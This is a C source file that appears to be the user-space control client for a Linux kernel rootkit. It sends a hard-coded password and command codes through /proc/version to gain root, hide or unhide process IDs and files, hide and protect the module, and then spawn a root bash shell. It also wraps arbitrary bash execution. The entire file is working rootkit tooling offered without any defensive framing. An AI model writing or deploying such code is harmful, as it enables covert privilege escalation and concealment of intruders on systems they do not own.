#include "OSCommunication.h"

#define CFG_PROC_FILE "version"
#define CFG_PASS "password"
#define CFG_ROOT 1
#define CFG_HIDE_PID 2
#define CFG_UNHIDE_PID 3
#define CFG_HIDE_FILE 4
#define CFG_UNHIDE_FILE 5
#define CFG_HIDE 6
#define CFG_UNHIDE 7
#define CFG_PROTECT 8
#define CFG_UNPROTECT 9

static char *create_buffer(int input, char *argument, int has_argument, size_t *buf_size)
{
    *buf_size = 0;

    *buf_size += sizeof(CFG_PASS);

    if ((input == 1 || (input >= 6 && input <= 9)) && !has_argument)
    {
        *buf_size += sizeof(char);
    }
    else if (input >= 2 && input <= 5 && has_argument)
    {
        *buf_size += sizeof(char) + strlen(argument);
    }
    else
        return NULL;

    *buf_size += 1; // for null terminator

    char *buffer = malloc(*buf_size);
    buffer[*buf_size - 1] = 0;

    char *buf_ptr = buffer;

    char to_alloc[2];
    sprintf(to_alloc, "%d", input);

    write_buffer(&buf_ptr, CFG_PASS, sizeof(CFG_PASS));
    write_buffer(&buf_ptr, to_alloc, strlen(to_alloc));
    if (has_argument)
        write_buffer(&buf_ptr, argument, strlen(argument));

    return buffer;
}

int start_module_command(char *input)
{
    char *argument;

    int has_argument = string_split(input, &argument, '=');

    int inputNumber = atoi(input);

    char *buffer;

    size_t buf_size;
    buffer = create_buffer(inputNumber, argument, has_argument, &buf_size);

    if (buffer == NULL)
        return -1;

    if (open_writeToFile("/proc/" CFG_PROC_FILE, buffer, buf_size) == -1)
        return -1;

    free(buffer);

    if (inputNumber == CFG_ROOT)
    {
        execl("/bin/bash", "bash", NULL);
    }
    return 0;
}

char * start_bash_command(char *bash_command){
    return run_bash_command(bash_command);
}
